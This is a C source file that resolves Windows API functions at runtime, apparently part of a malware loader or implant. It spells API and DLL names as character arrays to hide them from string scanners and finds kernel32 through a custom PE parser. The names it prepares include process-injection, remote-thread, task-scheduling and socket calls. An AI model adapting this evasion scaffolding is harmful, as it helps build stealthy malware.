#include "api.h"
#include "PEParser.h"
#include "Public.h"

ptrShellExecuteA		lpShellExecuteA;
ptrGetCommandLineW		lpGetCommandLineW = 0;
ptrCommandLineToArgvW	lpCommandLineToArgvW = 0;

ptrGetUserNameA			lpGetUserNameA = 0;
ptrGetComputerNameA		lpGetComputerNameA = 0;

ptrGetProcAddress		lpGetProcAddress = 0;
ptrLoadLibraryA			lpLoadLibraryA = 0;
ptrFreeLibrary			lpFreeLibrary = 0;

ptrVirtualAlloc			lpVirtualAlloc;
ptrVirtualFree			lpVirtualFree;
ptrVirtualProtect		lpVirtualProtect;
ptrWinExec				lpWinExec = 0;
ptrGetSystemDirectoryA	lpGetSystemDirectoryA = 0;
ptrGetModuleHandleA		lpGetModuleHandleA;
ptrNetWkstaGetInfo		lpNetWkstaGetInfo;
ptrNetApiBufferFree		lpNetApiBufferFree;

ptrMakeSureDirectoryPathExists			lpMakeSureDirectoryPathExists;

HMODULE					lpDllShell32;
HMODULE					lpDllNetApi32 = 0;
HMODULE					lpDlladvapi32;
HMODULE					lpDllKernel32;
HMODULE					lpDllDbghelp;


int getapi() {

	char szwsprintfA[] = { 'w','s','p','r','i','n','t','f','A',0 };
	char szwsprintfW[] = { 'w','s','p','r','i','n','t','f','W',0 };
	char szGetCurrentProcess[] = { 'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s',0 };

	char szDllUser32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
	char szDllWs2_32[] = { 'w','s','2','_','3','2','.','d','l','l',0 };
	char szDlladvapi32[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0 };
	char szDlliphlpapi[] = { 'i','p','h','l','p','a','p','i','.','d','l','l',0 };
	char szDllntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };


// 	char szRegCreateKeyA[] = { 'R','e','g','C','r','e','a','t','e','K','e','y','A',0 };
// 	char szRegCloseKey[] = { 'R','e','g','C','l','o','s','e','K','e','y',0 };
// 	char szRegQueryValueExA[] = { 'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A',0 };
// 	char szRegSetValueExA[] = { 'R','e','g','S','e','t','V','a','l','u','e','E','x','A',0 };
// 	char szRegOpenKeyExA[] = { 'R','e','g','O','p','e','n','K','e','y','E','x','A',0 };
// 	char szRegEnumKeyExA[] = { 'R','e','g','E','n','u','m','K','e','y','E','x','A',0 };
// 	char szRegCreateKeyExA[] = { 'R','e','g','C','r','e','a','t','e','K','e','y','E','x','A',0 };
// 	char szRegDeleteKeyA[] = { 'R','e','g','D','e','l','e','t','e','K','e','y','A',0 };

	char szconnect[] = { 'c','o','n','n','e','c','t',0 };
	char szWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	char szrecv[] = { 'r','e','c','v',0 };
	char szsend[] = { 's','e','n','d',0 };
	char szsocket[] = { 's','o','c','k','e','t',0 };
	char szclosesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	char szinet_addr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	char szntohs[] = { 'n','t','o','h','s',0 };
	char szsetsockopt[] = { 's','e','t','s','o','c','k','o','p','t',0 };
	char szgethostname[] = { 'g','e','t','h','o','s','t','n','a','m','e',0 };
	char szgethostbyname[] = { 'g','e','t','h','o','s','t','b','y','n','a','m','e',0 };

	char szLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	char szFreeLibrary[] = { 'F','r','e','e','L','i','b','r','a','r','y',0 };
	char szGetProcAddress[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };

	char szVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0 };
	char szVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 };
	char szVirtualFree[] = { 'V','i','r','t','u','a','l','F','r','e','e',0 };
	char szVirtualAllocEx[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };
	char szVirtualFreeEx[] = { 'V','i','r','t','u','a','l','F','r','e','e','E','x',0 };

	char szGetStartupInfoA[] = { 'G','e','t','S','t','a','r','t','u','p','I','n','f','o','A',0 };
	char szCreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
	char szWinExec[] = { 'W','i','n','E','x','e','c',0 };
	char szGetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
	char szGetModuleFileNameA[] = { 'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A',0 };
	char szExitProcess[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
	char szGetModuleHandleA[] = { 'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A',0 };

	char szCreateDirectoryA[] = { 'C','r','e','a','t','e','D','i','r','e','c','t','o','r','y','A',0 };

	char szGetCommandLineA[] = { 'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0 };
	char szGetCommandLineW[] = { 'G','e','t','C','o','m','m','a','n','d','L','i','n','e','W',0 };

	char szGetSystemInfo[] = { 'G','e','t','S','y','s','t','e','m','I','n','f','o',0 };

	char szGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
	char szGetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
	char szCreateToolhelp32Snapshot[] = { 'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t',0 };
	char szProcess32First[] = { 'P','r','o','c','e','s','s','3','2','F','i','r','s','t','W',0 };
	char szProcess32Next[] = { 'P','r','o','c','e','s','s','3','2','N','e','x','t','W',0 };

	char szDeviceIoControl[] = { 'D','e','v','i','c','e','I','o','C','o','n','t','r','o','l',0 };

	char szCreateThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d',0 };
	char szCreateMutexA[] = { 'C','r','e','a','t','e','M','u','t','e','x','A',0 };

	char szKernel32Dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };

	char szDllPsapi[] = { 'P','s','a','p','i','.','d','l','l',0 };
	char szEnumProcessModules[] = { 'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s',0 };
	char szEnumProcesses[] = { 'E','n','u','m','P','r','o','c','e','s','s','e','s',0 };
	char szGetModuleFileNameExA[] = { 'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','E','x','A',0 };

	char szOpenProcess[] = { 'O','p','e','n','P','r','o','c','e','s','s',0 };
	char szGetModuleBaseNameA[] = { 'G','e','t','M','o','d','u','l','e','B','a','s','e','N','a','m','e','A',0 };
	char szCreateRemoteThread[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };
	
	char szWriteProcessMemory[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };
	
	char szWaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
	char szGetExitCodeThread[] = { 'G','e','t','E','x','i','t','C','o','d','e','T','h','r','e','a','d',0 };
	char szWaitForMultipleObjects[] = { 'W','a','i','t','F','o','r','M','u','l','t','i','p','l','e','O','b','j','e','c','t','s',0 };
	char szExitThread[] = { 'E','x','i','t','T','h','r','e','a','d',0 };

	char szCreateEventA[] = { 'C','r','e','a','t','e','E','v','e','n','t','A',0 };
	char szSetEvent[] = { 'S','e','t','E','v','e','n','t',0 };
	char szTerminateProcess[] = { 'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s',0 };
	char szGetCurrentProcessId[] = { 'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','I','d',0 };
	char szSetFileAttributesA[] = { 'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A',0 };

	char szDllNetApi32[] = { 'n','e','t','a','p','i','3','2','.','d','l','l',0 };
	char szNetScheduleJobAddW[] = { 'N','e','t','S','c','h','e','d','u','l','e','J','o','b','A','d','d',0 }; ;
	char szNetWkstaGetInfo[] = { 'N','e','t','W','k','s','t','a','G','e','t','I','n','f','o',0 };
	char szNetApiBufferFree[] = { 'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e',0 };

	char szDllShell32[] = { 's','h','e','l','l','3','2','.','d','l','l',0 };
	char szShellExecuteExA[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','E','x','A',0 };
	char szShellExecuteExW[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','E','x','W',0 };

	char szDeleteFileW[] = { 'D','e','l','e','t','e','F','i','l','e','W',0 };
	
	char szCommandLineToArgvW[] = { 'C','o','m','m','a','n','d','L','i','n','e','T','o','A','r','g','v','W',0 };
	char szReleaseMutex[] = { 'R','e','l','e','a','s','e','M','u','t','e','x',0 };
	char szSetCurrentDirectoryA[] = { 'S','e','t','C','u','r','r','e','n','t','D','i','r','e','c','t','o','r','y','A',0 };

	char szRemoveDirectoryA[] = { 'R','e','m','o','v','e','D','i','r','e','c','t','o','r','y','A',0 };
	char szGetExitCodeProcess[] = { 'G','e','t','E','x','i','t','C','o','d','e','P','r','o','c','e','s','s',0 };
	char szCreatePipe[] = { 'C','r','e','a','t','e','P','i','p','e',0 };
	char szGetClassNameA[] = { 'G','e','t','C','l','a','s','s','N','a','m','e','A',0 };

	char szGetCurrentDirectoryA[] = { 'G','e','t','C','u','r','r','e','n','t','D','i','r','e','c','t','o','r','y','A',0 };
	char szDllShlwapi[] = { 's','h','l','w','a','p','i','.','d','l','l',0 };
	char szPathStripPathA[] = { 'P','a','t','h','S','t','r','i','p','P','a','t','h','A',0 };
	char szShellExecuteA[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','A',0 };

	char szWow64DisableWow64FsRedirection[] =
	{ 'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n',0 };
	char szWow64RevertWow64FsRedirection[] =
	{ 'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n',0 };

	char szFindResourceA[] = { 'F','i','n','d','R','e','s','o','u','r','c','e','A',0 };
	char szSizeofResource[] = { 'S','i','z','e','o','f','R','e','s','o','u','r','c','e',0 };
	char szLoadResource[] = { 'L','o','a','d','R','e','s','o','u','r','c','e',0 };
	char szLockResource[] = { 'L','o','c','k','R','e','s','o','u','r','c','e',0 };

	char szMakeSureDirectoryPathExists[] = { 'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0 };

	PEParser::getBaseApi(&lpDllKernel32,(char**)&lpGetProcAddress, (char**)&lpLoadLibraryA);
	if (lpGetProcAddress == 0 || lpLoadLibraryA == 0 || lpDllKernel32 == 0)
	{
		Public::writelog("lpDllKernel32 or lpLoadLibraryA or lpGetProcAddress null\r\n");
		return FALSE;
	}

	lpDlladvapi32 = lpLoadLibraryA(szDlladvapi32);
	lpGetUserNameA = (ptrGetUserNameA)lpGetProcAddress(lpDlladvapi32, szGetUserNameA);

	lpGetComputerNameA = (ptrGetComputerNameA)lpGetProcAddress(lpDllKernel32, szGetComputerNameA);
	lpWinExec = (ptrWinExec)lpGetProcAddress(lpDllKernel32, szWinExec);
	lpGetSystemDirectoryA = (ptrGetSystemDirectoryA)lpGetProcAddress(lpDllKernel32, szGetSystemDirectoryA);
	lpGetModuleHandleA = (ptrGetModuleHandleA)lpGetProcAddress(lpDllKernel32, szGetModuleHandleA);
	lpVirtualAlloc = (ptrVirtualAlloc)lpGetProcAddress(lpDllKernel32, szVirtualAlloc);
	lpVirtualFree = (ptrVirtualFree)lpGetProcAddress(lpDllKernel32, szVirtualFree);
	lpVirtualProtect = (ptrVirtualProtect)lpGetProcAddress(lpDllKernel32, szVirtualProtect);
	lpGetCommandLineW = (ptrGetCommandLineW)lpGetProcAddress(lpDllKernel32, szGetCommandLineW);

	lpDllNetApi32 = lpLoadLibraryA(szDllNetApi32);
	lpNetWkstaGetInfo = (ptrNetWkstaGetInfo)lpGetProcAddress(lpDllNetApi32, szNetWkstaGetInfo);
	lpNetApiBufferFree = (ptrNetApiBufferFree)lpGetProcAddress(lpDllNetApi32, szNetApiBufferFree);

	lpDllShell32 = lpLoadLibraryA(szDllShell32);
	lpShellExecuteA = (ptrShellExecuteA)lpGetProcAddress(lpDllShell32, szShellExecuteA);
	lpCommandLineToArgvW = (ptrCommandLineToArgvW)lpGetProcAddress(lpDllShell32, szCommandLineToArgvW);

	char szDbghelpDll[] = { 'D','b','g','h','e','l','p','.','d','l','l',0 };
	lpDllDbghelp = lpLoadLibraryA(szDbghelpDll);
	lpMakeSureDirectoryPathExists = (ptrMakeSureDirectoryPathExists)lpGetProcAddress(lpDllDbghelp, szMakeSureDirectoryPathExists);
	
	return TRUE;
}